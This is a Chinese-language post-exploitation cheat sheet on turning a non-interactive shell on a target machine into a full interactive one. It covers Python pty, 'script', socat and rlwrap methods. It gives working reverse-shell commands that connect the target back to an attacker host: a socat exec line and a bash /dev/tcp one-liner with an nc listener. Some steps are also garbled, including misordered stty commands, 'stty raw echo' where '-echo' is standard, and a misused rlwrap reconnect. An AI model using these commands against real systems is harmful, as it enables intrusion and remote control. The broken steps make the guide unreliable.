### 如何从非交互的 Shell 提升为交互 Shell

方法一：使用 Python PTY 模块（最常用）

如果目标系统安装了 Python，这是最简单、最可靠的方法

1. **执行命令：** 在你的非交互shell中输入并执行以下命令：

   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```

   这条命令会调用 Python 的`pty`模块，创建一个伪终端，并执行`/bin/bash`

2. **设置终端：** 此时，你已经获得了一个基本的交互式 shell，但可能仍然存在一些显示问题。接下来，需要通过以下命令进一步完善：

   ```bash
   # 这一步是设置环境变量，让终端知道自己是什么类型
   export TERM=xterm
   
   # 这一步是后台运行stty命令，捕获终端信号
   stty raw -echo
   ```

   **注意：** 最后一条命令 `stty raw -echo` 执行后，你的输入可能不会立即显示。这是正常的，你需要继续操作

3. **背景化（可选）：** 此时你的 shell 仍在前台，可以将其发送到后台：

   ```bash
   Ctrl + Z
   ```

   然后回到你自己的攻击机终端，执行以下命令，将 shell 重新拉回前台：

   ```bash
   stty raw echo
   fg
   ```

   现在，你拥有了一个功能完整的、带有 `Tab` 补全、上下箭头和 `Ctrl+C` 功能的交互式 shell

**方法二：使用 `script` 命令**

`script` 命令用于记录终端会话，但也可以用来提升 shell

1. **执行命令：**

   ```bash
   script /dev/null
   ```

   这条命令会启动一个新的 shell，并将所有输出写入 `/dev/null`。这实际上创建了一个新的伪终端

2. **完成设置：**

   ```bash
   Ctrl + C
   export SHELL=bash
   export TERM=xterm
   reset
   ```

   **注意：** 这种方法有时可能不稳定，并且在某些系统上可能不适用

**方法三：使用 `socat`**

`socat`是一个功能强大的网络工具，可以用于在两个位置之间建立双向数据流

1. **攻击机（监听端）：** 在你的攻击机上，使用 `socat` 监听一个端口

   ```bash
   socat file:`tty`,raw,echo=0 tcp-listen:4444
   ```

2. **目标机（执行端）：** 在非交互式 Shell中，使用 `socat` 连接到你的攻击机

   ```bash
   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<攻击机IP>:4444
   ```

3. **优势：** `socat` 的方法非常强大，可以创建非常稳定的交互式 Shell，并能处理各种终端信号

**方法四：使用 `rlwrap`（需要安装）**

`rlwrap` 是一个命令行工具，它可以为任何程序添加 `readline` 功能，包括历史记录和行编辑

1. **攻击机（监听端）：**

   ```bash
   nc -lvnp 4444
   ```

2. **目标机（执行端）：**

   ```bash
   bash -i >& /dev/tcp/<攻击机IP>/4444 0>&1
   ```

   此时，你获得了非交互式 Shell

3. **攻击机（提升 shell）：** 在你自己的攻击机上，使用 `rlwrap` 重新连接到目标主机，就可以获得一个带有历史记录和补全功能的 Shell

   ```bash
   rlwrap nc -v <目标机IP> 4444
   ```

   **注意：** 这需要 `rlwrap` 工具在你的攻击机上已经安装